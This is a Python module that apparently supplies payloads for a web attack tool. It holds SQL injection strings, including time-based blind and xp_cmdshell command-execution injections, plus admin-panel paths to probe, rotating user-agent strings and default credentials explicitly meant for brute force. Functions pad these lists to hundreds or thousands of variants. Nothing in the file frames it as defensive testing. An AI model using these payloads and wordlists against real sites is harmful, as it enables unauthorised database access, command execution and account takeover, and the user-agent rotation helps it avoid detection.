import random
import string

# Base lists for SQL payloads (easy + advanced)
BASE_SQL_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "' UNION SELECT NULL,NULL -- ",
    "' AND 1=1 -- ",
    "' AND 1=2 -- ",
    "' OR EXISTS(SELECT * FROM users) -- ",
    "'; EXEC xp_cmdshell('whoami') --",
    "' AND SLEEP(5) -- ",
    "' OR 1=CONVERT(int, (SELECT @@version)) -- ",
    "' OR 1=1;--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>64 --",
    "' OR 'a'='a' --",
    "' OR 1=(SELECT COUNT(*) FROM information_schema.tables) --",
    "'||(SELECT user())--",
    "' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END) IS NOT NULL --",
    "'; BEGIN DBMS_LOCK.SLEEP(5); END; --",
    "' OR 1=1 ORDER BY 1--"
]

# Base list for admin-page paths
BASE_ADMIN_PATHS = [
    "/adminconsole", "/admin-control", "/admin_area", "/admin_site", "/admin-access", "/adminzone",
    "/administrator", "/administrator/login", "/administrator/index", "/administrator/dashboard",
    "/administrator-console", "/administrator/configuration", "/administrator/settings",
    "/adm", "/adm/login", "/adm.php", "/_admin", "/_administrator",
    "/cpanel", "/cpanel/login", "/cp", "/cp/login", "/controlpanel", "/controlpanel/index"
]

# Base list of user-agents
BASE_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile; rv:88.0) Gecko/88.0 Firefox/88.0"
]

# Default username/password lists for brute force
DEFAULT_USERNAMES = ["admin", "root", "admin1", "admin2", "rootadmin"]
DEFAULT_PASSWORDS = ["password123", "admin", "123456", "root", "toor"]


def generate_sql_payloads(count=1000):
    """
    Return a list of `count` SQL payload strings.
    Start with the base list, then randomly append suffixes
    until we reach `count` distinct payloads.
    """
    payloads = BASE_SQL_PAYLOADS.copy()
    while len(payloads) < count:
        base = random.choice(BASE_SQL_PAYLOADS)
        rand_suffix = f" -- {''.join(random.choices(string.ascii_lowercase, k=3))}"
        new_payload = base + rand_suffix
        if new_payload not in payloads:
            payloads.append(new_payload)
    return payloads


def generate_admin_paths(count=1000):
    """
    Return a list of `count` admin-page paths.
    Start with the base list, then append numbered variants until reaching `count`.
    """
    paths = BASE_ADMIN_PATHS.copy()
    idx = 0
    while len(paths) < count:
        base = random.choice(BASE_ADMIN_PATHS).rstrip('/')
        new_path = f"{base}{idx}"
        if new_path not in paths:
            paths.append(new_path)
        idx += 1
    return paths


def generate_user_agents(count=500):
    """
    Return a list of `count` user-agent strings.
    Start with base list and add simple Safari/version random variants.
    """
    agents = BASE_USER_AGENTS.copy()
    while len(agents) < count:
        base = random.choice(BASE_USER_AGENTS)
        new_ua = f"{base} Safari/{random.randint(500,600)}.0"
        if new_ua not in agents:
            agents.append(new_ua)
    return agents


def default_usernames():
    return DEFAULT_USERNAMES


def default_passwords():
    # In practice, you could expand this to 1,000+ variations, but here
    # we keep a short default list. You may modify or expand as needed.
    return DEFAULT_PASSWORDS


def sanitize_filename(name):
    return name.replace('/', '_').replace(':', '_')
